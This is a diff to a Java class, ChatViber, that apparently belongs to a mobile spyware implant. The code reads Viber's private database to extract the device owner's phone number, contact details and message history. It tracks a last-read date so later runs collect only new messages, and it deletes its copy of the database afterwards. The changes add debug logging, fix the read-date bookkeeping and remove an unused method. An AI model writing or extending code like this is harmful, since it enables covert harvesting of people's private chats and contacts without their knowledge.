@@ -81,6 +81,7 @@ public class ChatViber extends SubModuleChat {
 				ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
 				Object one = oInputStream.readObject();
 				number = (String) one;
+				
 			} catch (Exception e) {
 				if (Cfg.DEBUG) {
 					e.printStackTrace();
@@ -89,6 +90,9 @@ public class ChatViber extends SubModuleChat {
 			}
 		}
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (readMyPhoneNumber): %s", number);
+		}
 		return number;
 	}
 
@@ -130,7 +134,6 @@ public class ChatViber extends SubModuleChat {
 				long newViberReadDate = 0;
 				List<ViberConversation> conversations = getViberConversations(helper, account, lastViberReadDate);
 				for (ViberConversation sc : conversations) {
-
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + sc.id + " date: " + sc.date);
 					}
@@ -149,7 +152,8 @@ public class ChatViber extends SubModuleChat {
 					
 				}
 				if (newViberReadDate > 0) {
-					updateMarkupViber(newViberReadDate, true);
+					lastViberReadDate = newViberReadDate;
+					updateMarkupViber(lastViberReadDate, true);
 				}
 				helper.deleteDb();
 			} else {
@@ -214,13 +218,16 @@ public class ChatViber extends SubModuleChat {
 				String display_name = cursor.getString(3);
 				boolean itsme = cursor.getInt(4) == 0;
 
-				
 				Contact contact;
 				
 				if(itsme){
 				   contact = new Contact(Long.toString(id), account, "", "");
 				}else{
 				   contact = new Contact(Long.toString(id), number, name, display_name);
+				}
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (fetchParticipants) %s", contact);
 				}
 				
 				if (number != null) {
@@ -279,10 +286,10 @@ public class ChatViber extends SubModuleChat {
 					Contact contact = groups.getContact(peer);
 					String thread = Long.toString(conversation.id);
 					if (isGroup) {
-						if (peer.equals("0")) {
-							peer = conversation.account;
-						}
-						to = groups.getGroupToName(peer, thread);
+						//if (peer.equals("0")) {
+						//	peer = conversation.account;
+						//}
+						to = groups.getGroupToName(from, thread);
 						toDisplay = to;
 					} else {
 						to = incoming ? conversation.account : conversation.remote;
@@ -318,48 +325,6 @@ public class ChatViber extends SubModuleChat {
 			}
 			return -1;
 		}
-
-	}
-
-	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
-		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();
-
-		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
-		queryBuilderIndex.setTables("threads");
-
-		String[] projection = { "thread_id", "address", "date", "body", "person" };
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
-
-		// iterate conversation indexes
-		while (cursor != null && cursor.moveToNext()) {
-			// f.5=key_remote_jid
-			String jid = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
-			// f.6=message_table_id
-			int mid = cursor.getInt(cursor.getColumnIndexOrThrow("date"));
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
-			}
-
-			int lastReadIndex = 0;
-			// if conversation is known, get the last read index
-			if (hastableConversationLastIndex.containsKey(jid)) {
-
-				lastReadIndex = hastableConversationLastIndex.get(jid);
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
-				}
-			}
-
-			// if there's something new, fetch new messages and update
-			// markup
-			if (lastReadIndex < mid) {
-				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
-			}
-
-		}
-		cursor.close();
-		cursor = null;
-		return changedConversations;
 	}
 
 	private void updateMarkupViber(long newLastId, boolean serialize) {
@@ -368,7 +333,14 @@ public class ChatViber extends SubModuleChat {
 		}
 		
 		try{
-			markup.writeMarkupSerializable(lastViberReadDate);
+			markup.writeMarkupSerializable(newLastId);
+			
+			Long verify = markup.unserialize(new Long(0));
+			if(!lastViberReadDate.equals(verify)){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateMarkupViber) Error: failed");
+				}
+			}
 			
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
